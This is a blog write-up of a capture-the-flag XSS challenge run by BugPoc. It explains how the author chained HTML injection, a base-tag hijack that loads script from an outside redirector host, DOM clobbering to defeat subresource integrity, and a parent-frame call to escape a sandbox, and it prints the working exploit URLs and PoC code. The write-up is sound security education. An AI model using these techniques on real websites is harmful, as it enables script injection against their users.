---
layout: post
title:  "Write-up: BugPoc November 2020 XSS Challenge"
date:   2020-11-10 03:00:00 +0000
categories: security
---

I've been getting into XSS challenges over the last few weeks and BugPoc recently announced a nice tough one:

<center><blockquote class="twitter-tweet" data-dnt="true" data-theme="dark"><p lang="en" dir="ltr">Check out our XSS CTF! Skip an Amazon Interview + $2k in prizes!<br><br>Submit solutions to before 11/09 10PM EDT.<br><br>Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demo<br><br>Good luck!<a href="https://t.co/aC97HcnibP">https://t.co/aC97HcnibP</a><a href="https://twitter.com/hashtag/bugbountytips?src=hash&amp;ref_src=twsrc%5Etfw">#bugbountytips</a></p>&mdash; BugPoC (@bugpoc_official) <a href="https://twitter.com/bugpoc_official/status/1324002625319260163?ref_src=twsrc%5Etfw">November 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></center>

## Getting Started

So, let's take a look around the challenge site. It looks like we have a "wacky text generator", which takes some text from a `<textarea>` and makes it "wacky" by applying a bunch of different fonts and colours to individual characters.

![An inital look](/assets/2020-11-10-bugpoc-xss/initial.png)

After trying the obvious approach of using `<script>alert(origin)</script>` and failing, it's time to dig into the code behind this page.

A quick scan of the HTML reveals an iframe which takes the input text and writes the styled output. Anything that takes input and returns output which is a function of it is a great first place to look for an XSS attack vector, so let's dig deeper.

![An interesting iframe...](/assets/2020-11-10-bugpoc-xss/iframe.png)

Navigating straight to the iframe src address (`https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!`) results in the following message:

![This page can only be viewed from an iframe](/assets/2020-11-10-bugpoc-xss/iframe-only.png)

Even though we see this message, we can see our input is still visible inside the `<title>` tag of the resultant page. Let's try to abuse this and try to inject some JavaScript.

## Content Security Policy

So using the URL `https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cscript%3Ealert(origin)%3C/script%3E` (closing the title tag as Chrome won't interpret script tags between them), we get the following output:

![Not quite XSS](/assets/2020-11-10-bugpoc-xss/blocked-xss.png)

Success! But wait, we don't see an alert box when we visit the page. Instead we see an error in the console explaining what's going on. We're violating the site's `Content Security Policy`, meaning Chrome will refuse to interpret our injected script.

![A CSP error](/assets/2020-11-10-bugpoc-xss/blocked-xss-error.png)

The CSP is in this case defined in the `Content-Security-Policy` HTTP header. 

![Not quite XSS](/assets/2020-11-10-bugpoc-xss/csp-header.png)

There's a great resource we can use for learning more about CSPs at [content-security-policy.com](https://content-security-policy.com/).

Let's break the policy down and use the above link to turn each part into something meaningful.

> `script-src 'nonce-pelundurtnhv' 'strict-dynamic'`

This allows script tags to be loaded in two different ways.

The `nonce-pelundurtnhv` part means that any `<script>` tag with a `nonce` attribute of `pelundurtnhv` will be interpreted. So could we inject something like `</title><script nonce="pelundurtnhv">alert(origin)</script>` to comply with this? Well, no. The `nonce` value is randomly generated on each page load. Unless we can predict the behaviour of the server's RNG, we won't be able to guess a valid nonce value and get our script executed. So it looks like it's time to forget about the nonce and move on.

![Nonce](/assets/2020-11-10-bugpoc-xss/rolf.jpg)

The `strict-dynamic` part means any *allowed* script can add more scripts to the page, and these will automatically be allowed. So if we could trick one of the existing script blocks to load a malicious script of ours, we could get our own code running.

> `frame-src 'self'`

This allows iframes with a `src` matching the site origin, so we can load iframes from `https://wacky.buggywebsite.com/*`.

`object-src 'none'`

This disallows all sources of browser plugins such as `<object>`, `<applet>`, `<embed>`. We won't be using these in our solution then.

## Analysing the &lt;script&gt; Tags

So we're looking to abuse an existing `<script>` tag to trick it into loading a script of our own.

Since one of the requirements of the challenge involves creating a proof-of-concept hosted on [bugpoc.com](https://bugpoc.com/), it seems as good a place as any to host the script file we're going to try to inject. We can use the [Mock Endpoint](https://bugpoc.com/testers/other/mock) tool to do this. It's essentially a handy endpoint that we can configure in a number of ways. In this instance, we're going to set some basic headers and a JavaScript payload, via a simple `200 OK` response.

![Mock endpoint](/assets/2020-11-10-bugpoc-xss/bugpoc-mock-endpoint.png)

Now we have our script ready, let's look for a way to inject it using the existing script tags on the site. Taking a look at the contents of `frame.html`, we can see several potential candidates.

The first doesn't look like it has a great deal of potential:

{% highlight html %}
<script nonce="efkzuyfqivsy">
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-154052950-4');
    
    !function(){var g=window.alert;window.alert=function(b){g(b),g(atob("TmljZSBKb2Igd2l0aCB0aGlzIENURiEgSWYgeW91IGVuam95ZWQgaGFja2luZyB0aGlzIHdlYnNpdGUgdGhlbiB5b3Ugd291bGQgbG92ZSBiZWluZyBhbiBBbWF6b24gU2VjdXJpdHkgRW5naW5lZXIhIEFtYXpvbiB3YXMga2luZCBlbm91Z2ggdG8gc3BvbnNvciBCdWdQb0Mgc28gd2UgY291bGQgbWFrZSB0aGlzIGNoYWxsZW5nZS4gUGxlYXNlIGNoZWNrIG91dCB0aGVpciBqb2Igb3BlbmluZ3Mh"))}}();
            
</script>
{% endhighlight %}

The first tag sets up Google Analytics, and then overrides the `alert()` function with it's own. Digging into this reveals a base64 encoded success message meant for later when we solve the challenge. Unless there's a vulnerability in the analytics code, the chances are this isn't the route we're meant to take.

The second tag is a bit meatier, and handles the main functionality - it makes text "wacky":

{% highlight html %}
<script nonce="efkzuyfqivsy">
    
    // array of colors 
    var colors = [
            "#006633",
            "#00AB8E",
            "#009933", 
            "#00CC33", 
            "#339966",
            ];
            
    // array of fonts
    var fonts = [
            "baloo-bhaina",
            "josefin-slab",
            "arvo",
            "lato",
            "volkhov",
            "abril-fatface",
            "ubuntu",
            "roboto",
            "droid-sans-mono",
            "anton",
    ];


    function randomInteger(max) {
            return Math.floor(Math.random() * Math.floor(max));
    }
            
    function makeRandom(element) {
            for ( var i = 0; i < element.length; i++) {
                var createNewText = '';
                var htmlColorTag = 'color:';
                for ( var j = 0; j < element[i].textContent.length; j++ ) {
                var riFonts = randomInteger(fonts.length);
                var riColors = randomInteger(colors.length);
                createNewText = createNewText + "<span class='" + fonts[riFonts] + "' style='" + htmlColorTag + colors[riColors] + "'>" + element[i].textContent[j] + "</span>";
                }
                element[i].innerHTML = createNewText;
        }			  
    }
    
    var text = document.getElementsByClassName('text');
    makeRandom(text);
    
</script>
{% endhighlight %}

It doesn't look exploitable in any obvious way. The only controllable input is the main input to the page, and this is escaped and broken down into single entities, each of which is wrapped in `<span>` tags.

Finally, the third script looks a little more interesting:

{% highlight html %}
<script nonce="efkzuyfqivsy">
	
    window.fileIntegrity = window.fileIntegrity || {
        'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
        'algorithm' : 'sha256',
        'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
        'creationtime' : 1602687229
    }

    // verify we are in an iframe
    if (window.name == 'iframe') {
        
        // securely load the frame analytics code
        if (fileIntegrity.value) {
            
            // create a sandboxed iframe
            analyticsFrame = document.createElement('iframe');
            analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
            analyticsFrame.setAttribute('class', 'invisible');
            document.body.appendChild(analyticsFrame);

            // securely add the analytics code into iframe
            script = document.createElement('script');
            script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
            script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
            script.setAttribute('crossorigin', 'anonymous');
            analyticsFrame.contentDocument.body.appendChild(script);
            
        }

    } else {
        document.body.innerHTML = `
        <h1>Error</h1>
        <h2>This page can only be viewed from an iframe.</h2>
        <video width="400" controls>
            <source src="movie.mp4" type="video/mp4">
        </video>`
    }
    
</script>
{% endhighlight %}

This script is appending an additional script tag to the page, which is exactly what we're looking for! 

There are a few problems to solve if we want to exploit this:

1. This will only happen if we're inside an iframe, or rather, if the name of the window is `iframe`.
2. The script to be loaded is hardcoded as `files/analytics/js/frame-analytics.js`. We can't change this path.
3. The script tag being appended has an `integrity` tag. This means the SHA256 hash of the script will be checked to make sure it is loading the expected content and not something being maliciously injected.
4. The iframe the script is injected into is sandboxed, meaning we aren't allowed modals (e.g. `alert()`) by default.

So, a non-trivial set of hurdles to overcome. Let's not get overwhelmed, and instead let's tackle them one at a time.

## Solving Problem 1: The Iframe Check

First, we'll look at the iframe check. We essentially need to make the following condition evaluate as `true`:

{% highlight js %}
 if (window.name == 'iframe') {
{% endhighlight %}

 This is actually quite an easy one to work around, and there are 2 obvious solutions here. If we set up our own web page that includes JavaScript which sets `window.name`, it will actually be preserved if we then redirect to the challenge site. Something like:

{% highlight html %}
<script>
window.name = 'iframe';
window.location = 'https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!';
</script>
{% endhighlight %}

We can try it out by running the above in the console.

![Look ma, no iframes!](/assets/2020-11-10-bugpoc-xss/no-iframe-required.png)

It works!

An alternative method would be to use the HTML injection we found earlier to inject an iframe into the page. We could use something like `https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3C/head%3E%3Cbody%3E%3Ciframe%20name=%22iframe%22%20src=%22https://wacky.buggywebsite.com/frame.html?param=it%20works%22%3E%3C/iframe%3E%3C/body%3E%3C/html%3E%3C!--`:

![Self-contained iframe](/assets/2020-11-10-bugpoc-xss/alternative.png)

This works too! I would generally prefer the second approach as it doesn't require an HTML page to be hosted elsewhere, but since we're hosting a PoC on BugPoc for this challenge, we may as well use the first. It means our URL can be a bit simpler too, which always helps when assembling a complex payload.

Either way, problem 1 is solved.

## Solving Problem 2: Hardcoded Script Src

The script being loaded has a hardcoded `src` of `files/analytics/js/frame-analytics.js`. 

{% highlight js %}
 script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
{% endhighlight %}

Well, there's nothing we can do to modify a hardcoded path, right? Well, actually, it isn't *completely* hardcoded. It's a relative URL, not an absolute one. Relative to what? The *base* URL, which in this case is `https://wacky.buggywebsite.com/`, meaning the final script loaded would be `https://wacky.buggywebsite.com/files/analytics/js/frame-analytics.js`. If we had way to change the base URL to `https://evil.com/`, the script would be loaded from `https://evil.com/files/analytics/js/frame-analytics.js` instead. If only it were that simple.

Well, it **is** that simple! We can use a [base](https://www.w3schools.com/tags/tag_base.asp) tag to achieve this. We can inject this in using the HTML injection vulnerability we discovered earlier. 

We already have our code hosted by BugPoc, but it's not at a path that ends with `files/analytics/js/frame-analytics.js`. We can correct this by using another useful BugPoc feature: a [Flexible Redirector](https://bugpoc.com/testers/other/redir). A flexible redirector redirects a request for any path on to another location. We can use it to redirect to the mock endpoint we created earlier. In this case BugPoc gives us the URL `https://xbwvcxixjx6o.redir.bugpoc.ninja`.

We can now add this to a base tag to load our script onto the page, so let's update our PoC accordingly:

{% highlight html %}
<script>
window.name = 'iframe';
window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://xbwvcxixjx6o.redir.bugpoc.ninja%22/%3E';
</script>
{% endhighlight %}

No `alert()` is visible, but checking the network panel reveals that our script is being successfully loaded:

![Self-contained iframe](/assets/2020-11-10-bugpoc-xss/script-loaded.png)

Nice! We can see why it isn't being run if we check the console:

![Self-contained iframe](/assets/2020-11-10-bugpoc-xss/integrity-check-failed.png)

It's blocked by SRI, which is problem 3 on our list...

## Problem 3: Subresource Integrity Checking

[Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) is another useful browser security feature. The hash of a file can be specified in the `integrity` attribute of the tag used to load it, and the browser will check that the hash of the actual loaded file matches the specified one. This prevents malicious actors replacing scripts with malicious ones. 

![Integrity](/assets/2020-11-10-bugpoc-xss/integrity.gif)

It's unlikely that we need to look for a Chrome bug here as if such a bug existed, Chrome would likely be patched before the challenge was over. Instead we need to look at the specific implementation within the challenge code.

Let's strip out the irrelevant code and focus on the SRI bits:

{% highlight js %}
    window.fileIntegrity = window.fileIntegrity || {
        'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
        'algorithm' : 'sha256',
        'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
        'creationtime' : 1602687229
    }

    // ...

    // securely load the frame analytics code
    if (fileIntegrity.value) {
        
        // ...

        // securely add the analytics code into iframe
        script = document.createElement('script');
        script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
        script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
        analyticsFrame.contentDocument.body.appendChild(script);        
    }

    // ...


{% endhighlight %}

The actual hash that gets set in the `integrity` attribute of the script is defined in `fileIntegrity.value`, which itself is set on the first line(s) of the above snippet. And here's where there's a bit of an *irregularity*:

{% highlight js %}
    window.fileIntegrity = window.fileIntegrity || {
        // ...
{% endhighlight %}

The `fileIntegrity` object has it's value set here, but it keeps it's original value if one is defined. Interesting! It's not defined elsewhere on the page, so why would it already be defined? And more importantly, can we define it?

You can reference elements within the DOM in JavaScript using `window.{id}`. For example:

{% highlight html %}
    <input type="text" id="fileIntegrity" value="itworks" />
    <script>
        console.log(window.fileIntegrity.value);
    </script>
{% endhighlight %}

The above results in `itworks` being logged to the console. So all we need to do is inject an `input` tag with an id of `fileIntegrity` and a `value` of the SHA256 hash of the file we're trying to inject.

Updating our PoC gives us:

{% highlight html %}
<script>
window.name = 'iframe';
window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://xbwvcxixjx6o.redir.bugpoc.ninja%22/%3E%3Cinput%20id%3d%22fileIntegrity%22%20value%3d%22sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc%3d%22%2f%3E';
</script>
{% endhighlight %}

It works! The integrity error is gone from the console. We still don't get an alert though, as the iframe is sandboxed...

![Self-contained iframe](/assets/2020-11-10-bugpoc-xss/sandboxed.png)

## Solving Problem 4: Sandboxed Iframe

We can't create modals within the iframe where our code is being run. The solution here is a simple one - call the `alert()` function on the parent frame instead.

We'll need to create a new Mock Endpoint using the following:

![Mock endpoint 2](/assets/2020-11-10-bugpoc-xss/bugpoc-mock-endpoint-2.png)

And then create a new Flexible Redirector for it:

![Flexible redirector](/assets/2020-11-10-bugpoc-xss/flexible-redirector.png)

Finally, adjusting our PoC code to include our new flexible redirector URL and the hash of our new file gives us:

{% highlight html %}
<script>
window.name = 'iframe';
window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://l7u6e2pccty7.redir.bugpoc.ninja%22/%3E%3Cinput%20id%3d%22fileIntegrity%22%20value%3d%22QkIPs1Inueee8IH%2bHXpScbWfI0zPgWJvCB9LGWZH/Wc%3d%22%2f%3E';
</script>
{% endhighlight %}

Boom! We have a working XSS!

![Winner!](/assets/2020-11-10-bugpoc-xss/chicken-dinner.png)

We can [host our PoC](https://bugpoc.com/testers/front-end) on BugPoc too, to make things easier to reproduce when submitting our report.

Here's the one I created:

Link: [https://bugpoc.com/poc#bp-kvVxxXyn](https://bugpoc.com/poc#bp-kvVxxXyn)
Password: `InsIPIdPug75`

You'll need to be running Chrome in order for it to work.

![Success](/assets/2020-11-10-bugpoc-xss/success.gif)

Thanks to [BugPoc](https://bugpoc.com) for a great challenge (and for some useful tools too.)

I'm looking forward to the next one!
